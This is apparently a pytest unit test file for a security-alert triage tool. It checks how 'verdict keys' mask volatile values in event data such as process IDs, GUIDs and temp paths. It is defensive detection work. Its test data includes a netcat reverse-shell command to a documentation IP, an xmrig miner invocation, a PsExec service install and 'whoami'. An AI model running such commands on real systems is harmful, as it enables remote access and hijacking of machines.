"""Verdict keys refine the fingerprint with the behaviour of the event, masking only what varies between repeats."""

from __future__ import annotations

from typing import Any, Dict

import pytest

from lg_sotf.domain.verdict_key import behaviour, normalize_value, verdict_key, verdict_key_of
from lg_sotf.models.alert import TRUNCATED_MARKER

pytestmark = pytest.mark.unit

FP = "a" * 64


def _service(name: str, image: str) -> Dict[str, Any]:
    return {"unmapped": {"data": {"win": {
        "system": {"eventID": "7045", "processID": "1508", "eventRecordID": "432727"},
        "eventdata": {"serviceName": name, "imagePath": image, "accountName": "LocalSystem"},
    }}}}


def _audit(uid: str, pid: str = "46031", args: tuple[str, ...] = ("ps", "aux")) -> Dict[str, Any]:
    return {"unmapped": {"data": {"audit": {
        "exe": "/usr/bin/ps", "command": "ps", "uid": uid, "euid": uid, "pid": pid, "ppid": "24434",
        "execve": {f"a{i}": a for i, a in enumerate(args)},
    }}}}


def test_a_different_service_on_the_same_host_has_another_key() -> None:
    edge = _service("edgeupdate", "C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe /svc")
    psexec = _service("PSEXESVC", "%SystemRoot%\\\\PSEXESVC.exe")
    assert verdict_key(FP, edge) != verdict_key(FP, psexec)
    assert behaviour(psexec) == {"service": ["%systemroot%\\psexesvc.exe", "psexesvc"], "user": ["localsystem"]}


def test_the_same_command_as_another_user_has_another_key() -> None:
    assert verdict_key(FP, _audit("33")) != verdict_key(FP, _audit("0"))
    assert behaviour(_audit("33"))["command"] == ["ps", "ps aux"]


def test_repeats_of_the_same_activity_share_a_key() -> None:
    """Process ids, event ids and record numbers are never read."""
    assert verdict_key(FP, _audit("0", pid="1")) == verdict_key(FP, _audit("0", pid="99999"))
    first = _service("edgeupdate", "x.exe")
    again = _service("edgeupdate", "x.exe")
    again["unmapped"]["data"]["win"]["system"]["processID"] = "2732"
    assert verdict_key(FP, first) == verdict_key(FP, again)
    assert verdict_key(FP, first) != verdict_key("b" * 64, first)
    assert verdict_key(None, first) is None and verdict_key("", first) is None


@pytest.mark.parametrize(
    ("one", "two"),
    [
        ("msiexec /i {6F9619FF-8B86-D011-B42D-00CF4FC964FF}", "msiexec /i {0A1B2C3D-0000-1111-2222-333344445555}"),
        ("backup.sh --at 2026-10-20T04:01:53Z", "backup.sh --at 2026-10-21T05:11:00Z"),
        ("C:\\Users\\svc\\AppData\\Local\\Temp\\tmp4F2A.tmp\\setup.exe", "C:\\Users\\svc\\AppData\\Local\\Temp\\tmp9C01.tmp\\setup.exe"),
        ("/tmp/tmp.k3Jd92/run.sh", "/tmp/tmp.Zp81qa/run.sh"),
        ("certutil -hashfile x 0123456789abcdef0123", "certutil -hashfile x fedcba98765432100000"),
        ("job --run-id 1793368823", "job --run-id 1793047470"),
        ("  Some.EXE   /Q ", "some.exe /q"),
    ],
)
def test_volatile_parts_are_masked(one: str, two: str) -> None:
    assert normalize_value(one) == normalize_value(two)


@pytest.mark.parametrize(
    ("one", "two"),
    [
        ("/tmp/xmrig --donate-level 1", "/tmp/backup --donate-level 1"),  # a named temp file is behaviour
        ("nc -e /bin/sh 203.0.113.5 4444", "nc -e /bin/sh 203.0.113.9 4444"),
        ("ps aux", "ps -ef"),
    ],
)
def test_meaningful_differences_are_kept(one: str, two: str) -> None:
    assert normalize_value(one) != normalize_value(two)


def test_entities_and_raw_are_read_too() -> None:
    by_entity = {"entities": {"processes": ["C:\\Windows\\System32\\cmd.exe"], "command_lines": ["cmd /c whoami"]}}
    assert behaviour(by_entity) == {"command": ["cmd /c whoami"], "process": ["c:\\windows\\system32\\cmd.exe"]}
    raw = {"event": {"ParentImage": "C:\\Windows\\explorer.exe", "User": "CORP\\alice", "ProcessId": 4242}}
    assert behaviour({}, raw) == {"parent": ["c:\\windows\\explorer.exe"], "user": ["corp\\alice"]}


def test_an_incomplete_alert_never_gets_a_key() -> None:
    assert verdict_key(FP, {"unmapped": {TRUNCATED_MARKER: {"original_bytes": 99_999}, "preview": "{}"}}) is None
    assert verdict_key(FP, {}, {"data": {TRUNCATED_MARKER: {"original_bytes": 1}}}) is None
    too_many = {"unmapped": {"events": [{"user": f"u{i}"} for i in range(40)]}}
    assert verdict_key(FP, too_many) is None
    deep: Dict[str, Any] = {"user": "x"}
    for _ in range(20):
        deep = {"n": deep}
    assert verdict_key(FP, {"unmapped": deep}) is None


def test_verdict_key_of_a_stored_alert() -> None:
    class Row:
        fingerprint = FP
        normalized = _audit("33")
        raw: Dict[str, Any] = {}

    assert verdict_key_of(Row()) == verdict_key(FP, _audit("33"), {})
    assert verdict_key_of({"fingerprint": FP, "normalized": _audit("33"), "raw": None}) == verdict_key(FP, _audit("33"))
    assert verdict_key_of({"fingerprint": FP, "normalized": None}) is None
